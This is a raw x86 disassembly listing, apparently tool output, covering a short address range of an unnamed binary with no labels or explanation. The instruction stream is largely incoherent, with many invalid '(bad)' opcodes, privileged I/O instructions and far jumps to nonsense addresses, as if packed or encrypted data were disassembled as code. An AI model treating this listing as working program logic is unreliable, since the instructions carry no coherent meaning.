  41d910:	imul   esp,ebx,0xffffffc8
  41d913:	mov    ds:0x25fccf54,al
  41d918:	or     dl,BYTE PTR [ecx+edi*8+0x385f57ca]
  41d91f:	jno    0x41d93b
  41d921:	xchg   esp,eax
  41d922:	mov    dl,0xc7
  41d924:	pop    ds
  41d925:	mov    edi,0xf3df2750
  41d92a:	sbb    eax,0x5cda1344
  41d92f:	loop   0x41d99a
  41d931:	mov    ebx,0xd674d6e0
  41d936:	stos   BYTE PTR es:[edi],al
  41d937:	mov    WORD PTR [esi-0x2a281737],fs
  41d93d:	push   ebp
  41d93e:	push   ecx
  41d93f:	xor    al,0xed
  41d941:	int    0x27
  41d943:	or     ch,bh
  41d945:	imul   eax,DWORD PTR [ebx+0x40],0x2a
  41d949:	int    0xfa
  41d94b:	imul   ecx,DWORD PTR [eax+0x7508fd92],0xab1b39b6
  41d955:	aaa    
  41d956:	adc    ch,BYTE PTR [ecx-0x32]
  41d959:	push   ss
  41d95a:	xchg   edi,eax
  41d95b:	add    DWORD PTR [edi-0x32],0x65
  41d95f:	pop    esp
  41d960:	inc    esi
  41d961:	popa   
  41d962:	mov    ds:0x947d4526,eax
  41d967:	test   al,ch
  41d969:	add    al,0x37
  41d96b:	in     al,0x85
  41d96d:	ret    0x5349
  41d970:	dec    eax
  41d971:	jp     0x41d920
  41d973:	adc    edi,DWORD PTR [esp+ebx*4+0x23]
  41d977:	div    edx
  41d979:	fcom   QWORD PTR [edx]
  41d97b:	xchg   ebp,eax
  41d97c:	xchg   edx,eax
  41d97d:	iret   
  41d97e:	sbb    BYTE PTR [esi+0x66879fc1],al
  41d984:	xor    dl,BYTE PTR [edx+esi*8+0x8b0d5ff]
  41d98b:	and    edx,DWORD PTR [ebp+0x0]
  41d98e:	loop   0x41d9cd
  41d990:	or     al,0xef
  41d992:	call   0xa45c2223
  41d997:	lock xor eax,0xc3d5a900
  41d99d:	and    BYTE PTR [ecx-0x1d],bh
  41d9a0:	nop
  41d9a1:	mov    cl,0xff
  41d9a3:	cmp    bh,BYTE PTR [edi+0x4fbb4786]
  41d9a9:	(bad)  
  41d9aa:	sbb    esi,DWORD PTR [ebp-0x14]
  41d9ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d9ae:	pop    edi
  41d9af:	xchg   bl,al
  41d9b1:	fadd   DWORD PTR [ebp+0x3f]
  41d9b4:	mov    esi,0x1495d670
  41d9b9:	mov    bl,al
  41d9bb:	aas    
  41d9bc:	hlt    
  41d9bd:	mov    ds:0xc0d5ecab,eax
  41d9c2:	adc    al,0x63
  41d9c4:	sbb    eax,ecx
  41d9c6:	push   esi
  41d9c7:	or     eax,0x15d5c9f8
  41d9cc:	mov    dl,0x56
  41d9ce:	jecxz  0x41d954
  41d9d0:	fld1   
  41d9d2:	pop    ecx
  41d9d3:	cmp    BYTE PTR [edi+0xcc791fc],cl
  41d9d9:	loop   0x41da09
  41d9db:	imul   ecx,DWORD PTR [ebp+0x7d],0x45b61738
  41d9e2:	jnp    0x41d9a7
  41d9e4:	dec    ecx
  41d9e5:	popf   
  41d9e6:	arpl   WORD PTR ds:[edi+edi*8+0x35],sp
  41d9eb:	rol    cl,0x8e
  41d9ee:	cmp    al,0xd7
  41d9f0:	and    bh,BYTE PTR [ecx-0x7e32b33a]
  41d9f6:	or     eax,0x6c0479cf
  41d9fb:	adc    DWORD PTR [eax+0x62f1886f],0xffffff98
  41da02:	sub    BYTE PTR fs:[eax+0x37a8c233],bh
  41da09:	push   0x6352bc58
  41da0e:	pop    edx
  41da0f:	sbb    BYTE PTR [edx+0x7a6fb0a8],dl
  41da15:	in     eax,dx
  41da16:	pop    edi
  41da17:	push   ds
  41da18:	out    dx,al
  41da19:	and    BYTE PTR [eax],ah
  41da1b:	cmp    ebx,ecx
  41da1d:	jle    0x41da25
  41da1f:	adc    al,0x9e
  41da21:	cmp    dl,al
  41da23:	outs   dx,DWORD PTR ds:[esi]
  41da24:	cdq    
  41da25:	cdq    
  41da26:	loop   0x41d9e4
  41da28:	call   0xec88:0xce56d4cb
  41da2f:	test   DWORD PTR [edi+0x49f7a236],esp
  41da35:	ret    0x49ad
  41da38:	call   0x38969ab5
  41da3d:	inc    esp
  41da3e:	xchg   esi,eax
  41da3f:	mov    ecx,0xbb28a48e
  41da44:	fs fwait
  41da46:	jmp    0xfce131b
  41da4b:	rcr    ecx,cl
  41da4d:	lahf   
  41da4e:	daa    
  41da4f:	dec    ebp
  41da50:	not    edx
  41da52:	repnz icebp 
  41da54:	fcom   QWORD PTR [ecx-0xf]
  41da57:	(bad)  
  41da58:	pop    es
  41da59:	lods   al,BYTE PTR ds:[esi]
  41da5a:	xchg   esi,eax
  41da5b:	pop    ss
  41da5c:	std    
  41da5d:	dec    esi
  41da5e:	pop    ss
  41da5f:	dec    esi
  41da60:	inc    esp
  41da61:	fidivr WORD PTR [esi+0x4b18e2d5]
  41da67:	and    BYTE PTR [esp+ecx*4],ch
  41da6a:	(bad)  
  41da6b:	out    0xc5,eax
  41da6d:	jg     0x41da53
  41da6f:	stos   DWORD PTR es:[edi],eax
  41da70:	jg     0x41dae9
  41da72:	mov    al,ds:0x58b4e624
  41da77:	data16 jl 0x41da34
  41da7a:	dec    ecx
  41da7b:	into   
  41da7c:	shr    ax,cl
  41da7f:	or     DWORD PTR [edx+ebx*4-0x4e],0xffffffa7
  41da84:	js     0x41da55
  41da86:	inc    edx
  41da87:	adc    bl,cl
  41da89:	inc    ebx
  41da8a:	xor    edi,DWORD PTR [ecx]
  41da8c:	fist   WORD PTR [eax+0xa8122eb]
  41da92:	xchg   esi,eax
  41da93:	jle    0x41daac
  41da95:	mov    ss,edi
  41da97:	pop    esp
  41da98:	pop    eax
  41da99:	cmp    al,cl
  41da9b:	or     al,0xc0
  41da9d:	pusha  
  41da9e:	add    ebp,DWORD PTR [edx+eax*8]
  41daa1:	pop    esi
  41daa2:	js     0x41dab3
  41daa4:	loope  0x41dac1
  41daa6:	jl     0x41daa4
  41daa8:	popa   
  41daa9:	pop    edi
  41daaa:	and    DWORD PTR ds:0xbbe9a705,edx
  41dab0:	mov    edx,DWORD PTR [ecx]
  41dab2:	push   ebx
  41dab3:	cmc    
  41dab4:	rcr    BYTE PTR [esi-0x6c61afc],1
  41daba:	sbb    eax,0x953b95ce
  41dabf:	push   ebp
  41dac0:	aas    
  41dac1:	aas    
  41dac2:	pop    ss
  41dac3:	pop    ecx
  41dac4:	sti    
  41dac5:	ret    
  41dac6:	mov    ch,0xa0
  41dac8:	xor    dl,BYTE PTR [edi+ebp*2-0x63028298]
  41dacf:	retf   
  41dad0:	sbb    DWORD PTR [eax],ebx
  41dad2:	inc    bh
  41dad4:	(bad)  
  41dad5:	pop    eax
  41dad6:	(bad)
  41dad9:	xor    edx,DWORD PTR [eax]
  41dadb:	repnz outs dx,BYTE PTR ds:[si]
  41dade:	cld    
  41dadf:	or     DWORD PTR [ebp-0x25e90015],esp
  41dae5:	push   eax
  41dae6:	imul   edi,DWORD PTR [edi],0x76
  41dae9:	dec    esp
  41daea:	inc    esp
  41daeb:	mov    al,0xf
  41daed:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41daef:	sbb    BYTE PTR [ebx],0x76
  41daf2:	push   0x7a
  41daf4:	cwde   
  41daf5:	stos   BYTE PTR es:[edi],al
  41daf6:	shr    DWORD PTR [edx-0x28f7e74d],cl
  41dafc:	add    BYTE PTR [ecx-0x1a],0x8
  41db00:	dec    esi
  41db01:	and    al,0x1b
  41db03:	jb     0x41db21
  41db05:	jg     0x41dab4
  41db07:	jp     0x41db3b
  41db09:	sub    al,BYTE PTR [eax-0x3c8b8501]
  41db0f:	cmp    esi,DWORD PTR [eax+0x36559582]
  41db15:	aad    0x59
  41db17:	sub    DWORD PTR [esi-0x41],0x3c
  41db1b:	xchg   edi,eax
  41db1c:	loope  0x41db6b
  41db1e:	arpl   WORD PTR ss:[ecx+ebx*1+0x264174ee],bx
  41db26:	repz (bad) 
  41db28:	(bad)  [esi+0x56]
  41db2b:	call   0xf317:0x36489355
  41db32:	cmp    ecx,DWORD PTR [edx+0x78]
  41db35:	mov    esi,0x70b93f22
  41db3a:	(bad)  
  41db3b:	mov    al,ds:0x2a3fb456
  41db40:	in     al,dx
  41db41:	jmp    0x41db4c
  41db43:	cmp    bl,BYTE PTR [ecx+0x271f5b99]
  41db49:	inc    eax
  41db4a:	pop    ss
  41db4b:	bswap  ebp
  41db4d:	cmp    eax,0xac54582e
  41db52:	jnp    0x41db6a
  41db54:	and    al,0x3a
  41db56:	xor    BYTE PTR [ebp+0x41],al
  41db59:	mov    bh,0xbd
  41db5b:	adc    al,0x69
  41db5d:	ds mov ebx,0x37b3e011
  41db63:	cmp    eax,0x69d6b19a
  41db68:	push   edi
  41db69:	nop
  41db6a:	stc    
  41db6b:	test   al,0xd5
  41db6d:	fsub   QWORD PTR [esp+edx*8-0x64162550]
  41db74:	call   0x4239e3f2
  41db79:	sub    DWORD PTR [esi],eax
  41db7b:	cmp    ebx,ebx
  41db7d:	and    BYTE PTR [esi-0x66],bl
  41db80:	clc    
  41db81:	mov    ?,WORD PTR [eax+0x6d]
  41db84:	adc    eax,0xbf831173
  41db89:	call   0x534b224d
  41db8e:	popf   
  41db8f:	push   ebx
  41db90:	sbb    al,dh
  41db92:	popf   
  41db93:	bound  ebp,QWORD PTR [ecx+eiz*8-0x52a30c89]
  41db9a:	xchg   BYTE PTR [esi+eiz*8-0x18],dh
  41db9e:	sub    al,0xd2
  41dba0:	sub    BYTE PTR [ebp-0x1b4bdc2d],ch
  41dba6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dba7:	stc    
  41dba8:	xchg   esi,eax
  41dba9:	xchg   esi,eax
  41dbaa:	adc    bh,dl
  41dbac:	(bad)  
  41dbae:	mov    bh,0x12
  41dbb0:	pop    edx
  41dbb1:	cmp    al,0xec
  41dbb3:	stos   BYTE PTR es:[edi],al
  41dbb4:	mov    BYTE PTR [edi-0x79780607],dh
  41dbba:	or     bl,dh
  41dbbc:	pop    es
  41dbbd:	add    BYTE PTR ds:0x3d0bbda2,bl
  41dbc3:	xor    dl,bh
  41dbc5:	add    DWORD PTR [ebx+ebp*4],ecx
  41dbc8:	in     al,dx
  41dbc9:	fld    DWORD PTR [ebx-0x5591784c]
  41dbcf:	je     0x41db92
  41dbd1:	je     0x41dbbc
  41dbd3:	push   edx
  41dbd4:	imul   esi,edi,0x657cc04b
  41dbda:	mov    dl,0x2c
  41dbdc:	icebp  
  41dbdd:	xor    cl,bh
  41dbdf:	push   esp
  41dbe0:	pop    es
  41dbe1:	gs jmp 0x77fc5087
  41dbe7:	das    
  41dbe8:	out    dx,eax
  41dbe9:	xor    BYTE PTR [esi+0x22],ah
  41dbec:	xlat   BYTE PTR ds:[ebx]
  41dbed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbee:	pop    edi
  41dbef:	or     al,0x10
  41dbf1:	icebp  
  41dbf2:	out    dx,eax
  41dbf3:	dec    eax
  41dbf4:	xor    eax,0x7797442c
  41dbf9:	pusha  
  41dbfa:	icebp  
  41dbfb:	mov    edx,0xd7c7da4e
  41dc00:	push   eax
  41dc01:	ret    0x4980
  41dc04:	arpl   WORD PTR [esi+0x4d3ce5c4],dx
  41dc0a:	or     DWORD PTR [edx],ebp
  41dc0c:	fmul   st(6),st
  41dc0e:	sahf   
  41dc0f:	adc    ecx,esp
  41dc11:	daa    
  41dc12:	inc    ebp
  41dc13:	in     eax,0xfa
  41dc15:	sub    eax,0x65d64d74
  41dc1a:	mov    fs,WORD PTR ds:0x1081bf45
  41dc20:	push   cs
  41dc21:	dec    esi
  41dc22:	outs   dx,DWORD PTR ds:[esi]
  41dc23:	nop
  41dc24:	int    0xf0
  41dc26:	push   edi
  41dc27:	or     BYTE PTR [edi-0x245d4bd3],cl
  41dc2d:	sub    al,0x2e
  41dc2f:	xor    bh,BYTE PTR [ebx]
  41dc31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc33:	cmp    al,0x3
  41dc35:	(bad)  
  41dc36:	cmp    DWORD PTR [ebp+0x6ffab433],edx
  41dc3c:	fist   WORD PTR [esp+esi*8]
  41dc3f:	inc    edx
  41dc40:	inc    edi
  41dc41:	lods   al,BYTE PTR fs:[esi]
  41dc43:	inc    ebx
  41dc44:	push   ss
  41dc45:	icebp  
  41dc46:	push   ebp
  41dc47:	push   edx
  41dc48:	in     eax,dx
  41dc49:	push   ss
  41dc4a:	jb     0x41dc2e
  41dc4c:	loop   0x41dc91
  41dc4e:	stos   DWORD PTR es:[edi],eax
  41dc4f:	xor    ecx,edx
  41dc51:	and    eax,0x2911afcc
  41dc56:	pop    eax
  41dc57:	sbb    eax,0x3f8eee65
  41dc5c:	imul   esi,DWORD PTR [ecx+0x4973e2a],0xc000dc26
  41dc66:	push   ds
  41dc67:	ss imul edx,DWORD PTR gs:[ebx-0x34],0x97bbec3
  41dc70:	and    al,0x71
  41dc72:	cmp    esp,0xa0ed403c
  41dc78:	in     eax,dx
  41dc79:	(bad)  
  41dc7a:	ss push edi
  41dc7c:	arpl   bp,di
  41dc7e:	cwde   
  41dc7f:	dec    ebx
  41dc80:	xchg   edx,eax
  41dc81:	dec    ebx
  41dc82:	hlt    
  41dc83:	inc    edi
  41dc84:	xchg   ebp,eax
  41dc85:	cmc    
  41dc86:	pop    es
  41dc87:	sub    al,0x4f
  41dc89:	inc    edx
  41dc8a:	jg     0x41dc62
  41dc8c:	outs   dx,DWORD PTR ds:[esi]
  41dc8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc8e:	out    0x13,al
  41dc90:	(bad)  
  41dc91:	push   eax
  41dc92:	mov    dl,0xd7
  41dc94:	fadd   st,st(7)
  41dc96:	(bad)  
  41dc97:	sub    eax,0x612c9711
  41dc9c:	xor    al,0xc9
  41dc9e:	pop    esp
  41dc9f:	es loop 0x41dc32
  41dca2:	imul   ebp,ebp,0xffffffe6
  41dca5:	outs   dx,DWORD PTR ds:[esi]
  41dca6:	dec    esp
  41dca7:	and    eax,0xb18c10cb
  41dcac:	pop    esi
  41dcad:	mov    eax,ds:0x5e443451
  41dcb2:	and    bh,bl
  41dcb4:	mov    ch,0x9b
  41dcb6:	js     0x41dcaf
  41dcb8:	daa    
  41dcb9:	mov    DWORD PTR [edi+0x5ecf80f0],esi
  41dcbf:	pop    ecx
  41dcc0:	jmp    0x41dc48
  41dcc2:	inc    esp
  41dcc3:	sub    DWORD PTR [edi-0x54],0xffffff97
  41dcc7:	shl    BYTE PTR [ebx],cl
  41dcc9:	cs xor eax,0xfc4a4858
  41dccf:	jno    0x41dd3d
  41dcd1:	or     eax,0xc9d98a5
  41dcd6:	jns    0x41dcef
  41dcd8:	ds sti 
  41dcda:	mov    ch,0x31
  41dcdc:	je     0x41dd3c
  41dcde:	adc    BYTE PTR [edi+0x1e],ah
  41dce1:	lods   eax,DWORD PTR ds:[esi]
  41dce2:	jmp    0x49f:0x95490cdb
  41dce9:	aaa    
  41dcea:	sbb    bh,cl
  41dcec:	(bad)  
  41dced:	cli    
  41dcee:	xlat   BYTE PTR ds:[ebx]
  41dcef:	inc    esp
  41dcf0:	adc    bl,cl
  41dcf2:	shl    DWORD PTR [ecx-0x212ebb08],1
  41dcf8:	mov    edx,0xb06462d0
  41dcfd:	jl     0x41dcf0
  41dcff:	test   BYTE PTR [eax+0x6],0xd1
  41dd03:	inc    ecx
  41dd04:	mov    bh,0xff
  41dd06:	hlt    
  41dd07:	sbb    al,0xc5
  41dd09:	pusha  
  41dd0a:	imul   dl
  41dd0c:	or     BYTE PTR [edi],dh
  41dd0e:	and    eax,0x12a0dbfd
  41dd13:	inc    ebp
  41dd14:	fisubr DWORD PTR es:[esi+0x57a0b0c2]
  41dd1b:	fucom  st(4)
  41dd1d:	outs   dx,DWORD PTR ds:[esi]
  41dd1e:	loope  0x41dd90
  41dd20:	inc    esi
  41dd21:	mov    bh,0x62
  41dd23:	cs dec esp
  41dd25:	jmp    FWORD PTR [esi+0x3b2045db]
  41dd2b:	mov    bh,0xf1
  41dd2d:	ins    DWORD PTR es:[edi],dx
  41dd2e:	jo     0x41dd2d
  41dd30:	xchg   BYTE PTR cs:[ebp-0x6b],ah
  41dd34:	mov    bh,0xe7
  41dd36:	stc    
  41dd37:	out    dx,eax
  41dd38:	ins    BYTE PTR es:[edi],dx
  41dd39:	pop    ecx
  41dd3a:	aad    0x5b
  41dd3c:	popa   
  41dd3d:	in     al,dx
  41dd3e:	mov    esp,0x1e8030e8
  41dd43:	dec    ebx
  41dd44:	stc    
  41dd45:	push   es
  41dd46:	jle    0x41dce3
  41dd48:	or     ecx,DWORD PTR ds:0xecff8f7d
  41dd4e:	or     edx,esp
  41dd50:	xor    dh,BYTE PTR [esi-0x22]
  41dd53:	popa   
  41dd54:	xor    eax,edx
  41dd56:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd58:	dec    edi
  41dd59:	imul   esi,esi,0xffffff90
  41dd5c:	jg     0x41dd8f
  41dd5e:	aas    
  41dd5f:	les    eax,FWORD PTR [eax-0x2]
  41dd62:	(bad)  
  41dd63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd64:	mov    ebx,0x748cb395
  41dd69:	push   cs
  41dd6a:	dec    ebp
  41dd6b:	jecxz  0x41dd71
  41dd6d:	mov    ?,WORD PTR [ebx+0xc]
  41dd70:	sub    bh,BYTE PTR [ecx-0x4a]
  41dd73:	cmp    al,0x50
  41dd75:	stc    
  41dd76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd77:	call   0xfed7:0xc69e6199
  41dd7e:	(bad)  ds:0xb0346b03
  41dd84:	ins    DWORD PTR es:[edi],dx
  41dd85:	xchg   esi,eax
  41dd86:	pop    edi
  41dd87:	je     0x41dd98
  41dd89:	outs   dx,BYTE PTR ds:[esi]
  41dd8a:	dec    edi
  41dd8b:	mov    esi,0x1eefe222
  41dd90:	mov    edx,0xf0d44866
  41dd95:	stc    
  41dd96:	or     al,BYTE PTR [ebx-0x671204f]
  41dd9c:	sub    eax,0x477fd098
  41dda1:	arpl   bp,cx
  41dda3:	or     edi,edi
  41dda5:	std    
  41dda6:	xchg   esp,eax
  41dda7:	mov    WORD PTR [ebx+0x6ad4b59e],gs
  41ddad:	jmp    0xd553a648
  41ddb2:	cdq    
  41ddb3:	jmp    0xfc79b6ad
  41ddb8:	in     al,0xf8
  41ddba:	in     eax,dx
  41ddbb:	and    DWORD PTR [edi+ecx*8-0x55],ecx
  41ddbf:	fnstsw WORD PTR [edx-0x6b01ac74]
  41ddc5:	adc    eax,0x8f485371
  41ddca:	mov    bh,0x41
  41ddcc:	adc    eax,0x1f88591b
  41ddd1:	shl    BYTE PTR [eax],0x5a
  41ddd4:	ins    BYTE PTR es:[edi],dx
  41ddd5:	pop    ds
  41ddd6:	repnz aam 0xc3
  41ddd9:	push   ebx
  41ddda:	jl     0x41de25
  41dddc:	dec    ecx
  41dddd:	sub    al,dh
  41dddf:	pop    edx
  41dde0:	adc    esp,DWORD PTR ds:0xdf5ef6f9
  41dde6:	jmp    0xeed3:0x74543611
  41dded:	cwde   
  41ddee:	cmp    BYTE PTR [ebx-0x58b85f04],bl
  41ddf4:	call   0xb95b1995
  41ddf9:	or     eax,0xcaa96116
  41ddfe:	enter  0x7e72,0x3a
  41de02:	xchg   ebp,eax
  41de03:	and    ecx,esi
  41de05:	sbb    edi,ebx
  41de07:	div    BYTE PTR [edi-0x72]
  41de0a:	cli    
  41de0b:	outs   dx,BYTE PTR ds:[esi]
  41de0c:	loopne 0x41de64
  41de0e:	dec    esp
  41de0f:	int3   
  41de10:	mov    bl,0x51
  41de12:	xlat   BYTE PTR ds:[ebx]
  41de13:	lods   eax,DWORD PTR ds:[esi]
  41de14:	div    BYTE PTR [edx+0x26]
  41de17:	int    0xe6
  41de19:	stc    
  41de1a:	xor    DWORD PTR [edi-0x4],ecx
  41de1d:	jae    0x41dde6
  41de1f:	xlat   BYTE PTR ds:[ebx]
  41de20:	push   ecx
  41de21:	and    DWORD PTR [ecx],eax
  41de23:	sbb    al,0x84
  41de25:	fwait
  41de26:	dec    eax
  41de27:	adc    DWORD PTR [esi],edx
  41de29:	pop    ss
  41de2a:	in     al,dx
  41de2b:	imul   esi,DWORD PTR [edi-0x50fa8a5b],0x38
  41de32:	jo     0x41ddc9
  41de34:	cmp    BYTE PTR [esi+0x5b9a1fa7],0xdd
  41de3b:	jnp    0x41de95
  41de3d:	cld    
  41de3e:	inc    esp
  41de3f:	mov    bh,0x16
  41de41:	dec    ebp
  41de42:	out    dx,al
  41de43:	int3   
  41de44:	adc    eax,0x783a07cc
  41de49:	ds push ebp
  41de4b:	adc    BYTE PTR [ebx+0x60],bh
  41de4e:	and    bl,BYTE PTR [ecx-0x3bca1a07]
  41de54:	clc    
  41de55:	adc    al,BYTE PTR [edx]
  41de57:	jmp    0x41ddf4
  41de59:	xchg   ebp,eax
  41de5a:	dec    ebx
  41de5b:	xchg   ebp,eax
  41de5c:	das    
  41de5d:	loopne 0x41de16
  41de5f:	jl     0x41ddfe
  41de61:	jmp    0x36ff:0xc94707cf
  41de68:	sar    DWORD PTR [ebx+eiz*8],0xf1
  41de6c:	test   al,0xc4
  41de6e:	mul    DWORD PTR [edx+0x7b]
  41de71:	ret    
  41de72:	push   esi
  41de73:	mov    ds:0x1f60eb96,eax
  41de78:	ror    BYTE PTR [ebp+0x14],cl
  41de7b:	push   0xffffffcf
  41de7d:	nop
  41de7e:	jae    0x41de89
  41de80:	das    
  41de81:	sub    al,BYTE PTR [edx+eax*2+0x53ff1a76]
  41de88:	xor    BYTE PTR [ebx-0x3d],dl
  41de8b:	aam    0x72
  41de8d:	data16 out 0xaa,al
  41de90:	and    bl,cl
  41de92:	xlat   BYTE PTR ds:[ebx]
  41de93:	mov    WORD PTR [esi+0x41],cs
  41de96:	cwde   
  41de97:	mov    esp,0xc1d8fa82
  41de9c:	or     BYTE PTR [esi],ah
  41de9e:	cmp    bl,ah
  41dea0:	mov    WORD PTR [edx],gs
  41dea2:	push   ecx
  41dea3:	mov    edi,0x2cf47bbb
  41dea8:	lea    ebp,[edx]
  41deaa:	out    0xb9,eax
  41deac:	sbb    DWORD PTR [eax+0x1f17697e],0xffffffc9
  41deb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41deb4:	loope  0x41de4a
  41deb6:	xor    DWORD PTR [edi-0x59],0xffffff9a
  41deba:	(bad)  
  41debb:	test   eax,0x2a8be339
  41dec0:	fld    DWORD PTR [esi]
  41dec2:	fild   QWORD PTR [eax-0x32]
  41dec5:	fcom   QWORD PTR [ebp+0x18f20f3]
  41decb:	(bad)  
  41decc:	cmp    ah,BYTE PTR [eax]
  41dece:	(bad)  
  41decf:	inc    esi
  41ded0:	cmp    cl,BYTE PTR [edi+esi*8+0x7591721e]
  41ded7:	aam    0x28
  41ded9:	jbe    0x41df2a
  41dedb:	mov    ebp,0xa5acddda
  41dee0:	pop    ds
  41dee1:	sbb    al,0x16
  41dee3:	leave  
  41dee4:	sbb    DWORD PTR [ebx],esi
  41dee6:	jnp    0x41de71
  41dee8:	cmp    al,0xc3
  41deea:	mov    edi,0x10d29eb1
  41deef:	mov    dl,0x2b
  41def1:	inc    ebx
  41def2:	(bad)  
  41def3:	js     0x41dec8
  41def5:	ins    BYTE PTR es:[edi],dx
  41def6:	gs repnz aam 0x37
  41defa:	in     al,0x43
  41defc:	arpl   bx,ax
  41defe:	xchg   esi,eax
  41deff:	mov    cl,0x81
  41df01:	cmp    eax,esp
  41df03:	test   DWORD PTR [edi+0x11],esp
  41df06:	leave  
  41df07:	sub    bl,bh
  41df09:	(bad)  
  41df0a:	pusha  
  41df0b:	add    DWORD PTR [edi-0x20],edx
  41df0e:	xchg   ebp,eax
  41df10:	retf   0xb04f
  41df13:	inc    esp
  41df14:	mov    WORD PTR [ebp+0x12],gs
  41df17:	sub    BYTE PTR [edi],ch
  41df19:	push   ebx
  41df1a:	inc    eax
  41df1b:	arpl   WORD PTR [ebp+0x42110f27],bp
  41df21:	cli    
  41df22:	push   0x1873b535
  41df27:	jne    0x41df52
  41df29:	scas   al,BYTE PTR es:[edi]
  41df2a:	cmp    eax,0xd3030be6
  41df2f:	push   ebx
  41df30:	sub    ecx,DWORD PTR [ebx]
  41df32:	sub    BYTE PTR cs:[ebx],ah
  41df35:	(bad)  
  41df36:	adc    esp,DWORD PTR [ebx+0x7d01544d]
  41df3c:	jno    0x41df33
  41df3e:	sub    al,0x6d
  41df40:	mov    ebx,0x77b5dd23
  41df45:	ret    
  41df46:	mov    al,0xa3
  41df48:	aas    
  41df49:	mov    ch,0x71
  41df4b:	jne    0x41dfab
  41df4d:	sub    ebp,esi
  41df4f:	test   DWORD PTR [edx],0xb0251a7a
  41df55:	jns    0x41df9a
  41df57:	cmp    eax,0xa5c26c53
  41df5c:	(bad)  [ecx+ebx*8]
  41df5f:	sbb    eax,0x3c5c573f
  41df64:	leave  
  41df65:	jnp    0x41df08
  41df67:	or     al,0xea
  41df69:	sub    eax,0xe03bd985
  41df6e:	retf   0x31a4
  41df71:	loope  0x41df78
  41df73:	pop    es
  41df74:	adc    eax,0x2ae1e109
  41df79:	outs   dx,BYTE PTR ss:[esi]
  41df7b:	test   eax,0xef96c022
  41df80:	retfw  
  41df82:	in     eax,dx
  41df83:	xor    ch,ah
  41df85:	jp     0x41df10
  41df87:	mov    DWORD PTR [edi+0xc],eax
  41df8a:	jecxz  0x41df4d
  41df8c:	jns    0x41dff4
  41df8e:	or     ebx,ecx
  41df90:	sub    BYTE PTR [eax+0x5a],bl
  41df93:	and    DWORD PTR [edi-0x24],0x19
  41df97:	out    dx,eax
  41df98:	mov    ebp,0xa3b77d2a
  41df9d:	popf   
  41df9e:	je     0x41df51
  41dfa0:	hlt    
  41dfa1:	mul    cl
  41dfa3:	inc    esp
  41dfa4:	clc    
  41dfa5:	loopne 0x41dfd0
  41dfa7:	mov    dl,0x20
  41dfa9:	dec    eax
  41dfaa:	xchg   esp,eax
  41dfab:	shl    DWORD PTR [eax-0x305d8e5d],cl
  41dfb1:	test   BYTE PTR [edx],0xe9
  41dfb4:	dec    si
  41dfb6:	dec    esp
  41dfb7:	std    
  41dfb8:	ror    bh,0x1e
  41dfbb:	or     BYTE PTR [ebp-0x5d],dh
  41dfbe:	jnp    0x41df9d
  41dfc0:	(bad)  
  41dfc1:	push   ebx
  41dfc2:	(bad)  
  41dfc3:	or     BYTE PTR ds:0xdf94346f,ch
  41dfc9:	sub    ecx,ebp
  41dfcb:	xchg   ebx,eax
  41dfcc:	push   eax
  41dfcd:	jmp    0x4138:0x15bc77d5
  41dfd4:	add    esi,DWORD PTR [ebx-0x126746b8]
  41dfda:	push   esp
  41dfdb:	pop    ecx
  41dfdc:	jmp    0xe931:0xeee2b210
  41dfe3:	push   cs
  41dfe4:	icebp  
  41dfe5:	mul    DWORD PTR [esi-0x27]
  41dfe8:	gs mov ebx,0x48f400ad
  41dfee:	jbe    0x41e04d
  41dff0:	xchg   ebp,eax
  41dff1:	int    0x73
  41dff3:	ins    DWORD PTR es:[edi],dx
  41dff4:	cmp    al,0x7
  41dff6:	in     eax,dx
  41dff7:	fcom   QWORD PTR [ebp+eiz*2+0x23256b6a]
  41dffe:	or     BYTE PTR ds:0x2ae5041c,bl
  41e004:	stos   DWORD PTR es:[edi],eax
  41e005:	add    al,BYTE PTR [ebx-0x11942037]
  41e00b:	out    dx,eax
  41e00c:	xlat   BYTE PTR ds:[ebx]
  41e00d:	fisubr WORD PTR [edi-0x31]
  41e010:	fmul   st(6),st
  41e012:	or     ah,BYTE PTR ds:0x935df8e5
  41e018:	mov    ebp,0x6e7040a7
  41e01d:	mov    edx,0xbb2110bb
  41e022:	and    BYTE PTR [edx-0x5a],bl
  41e025:	jmp    0x41dfdf
  41e027:	mov    edx,0x14cab455
  41e02c:	out    dx,eax
  41e02d:	repnz cs push ss
  41e030:	adc    eax,DWORD PTR [ebp+0x26]
  41e033:	dec    edi
  41e034:	imul   DWORD PTR ds:0xa3708a8f
  41e03a:	adc    al,0xa6
  41e03c:	jmp    0x41e039
  41e03e:	loope  0x41dfc0
  41e040:	and    ah,ch
  41e042:	ret    0x76e2
  41e045:	shr    DWORD PTR [ecx+edx*2-0x4a0dba78],0x1f
  41e04d:	jns    0x41e006
  41e04f:	push   ecx
  41e050:	jbe    0x41e0c4
  41e052:	fcmovbe st,st(7)
  41e054:	mov    ch,0x41
  41e056:	push   edi
  41e057:	mov    BYTE PTR [ecx-0x11],cl
  41e05a:	dec    ebp
  41e05b:	xor    eax,DWORD PTR [ebp+0x3c]
  41e05e:	mov    dl,BYTE PTR [ebx+ecx*4-0x13]
  41e062:	mov    DWORD PTR [ecx-0x6e78c308],0xa25d56f
  41e06c:	push   edi
  41e06d:	pop    edx
  41e06e:	les    eax,FWORD PTR [edx]
  41e070:	sbb    BYTE PTR [ebp+0x49],ah
  41e073:	xor    ch,0x6e
  41e076:	shl    DWORD PTR [edx-0x11],1
  41e079:	sub    eax,0x142bfdb0
  41e07e:	and    eax,DWORD PTR [ebx-0x73]
  41e081:	and    BYTE PTR [edi+0x5a],bh
  41e084:	jg     0x41e0ba
  41e086:	xchg   edx,eax
  41e087:	sbb    ah,BYTE PTR [edi+ecx*2-0x54]
  41e08b:	dec    eax
  41e08c:	(bad)  
  41e08d:	and    al,0xe8
  41e08f:	mov    ch,0x6d
  41e091:	pop    esp
  41e092:	daa    
  41e093:	push   DWORD PTR [ebx]
  41e095:	lock jmp 0x6992:0x67c04000
